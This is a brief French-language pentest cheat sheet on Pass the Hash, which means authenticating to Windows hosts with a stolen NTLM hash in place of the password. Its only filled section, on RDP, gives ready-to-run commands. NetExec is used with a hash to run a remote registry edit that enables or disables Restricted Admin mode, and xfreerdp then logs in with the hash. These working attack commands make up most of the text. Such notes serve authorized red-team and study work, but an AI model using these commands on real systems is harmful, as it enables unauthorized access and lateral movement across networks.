# Pass the Hash

Permet de se connecter avec le hash de l'utilisateur / compte machine plutôt que son mot de passe.

## SMB

## WinRM

## RDP

```bash
# https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef
nxc smb 192.168.0.1 -u "username" -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' # autorise
nxc smb 192.168.0.1 -u "username" -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f' # désactive
xfreerdp /v:192.168.0.1 /u:username /pth:<NT_HASH>
```

https://www.thehacker.recipes/ad/movement/ntlm/pth
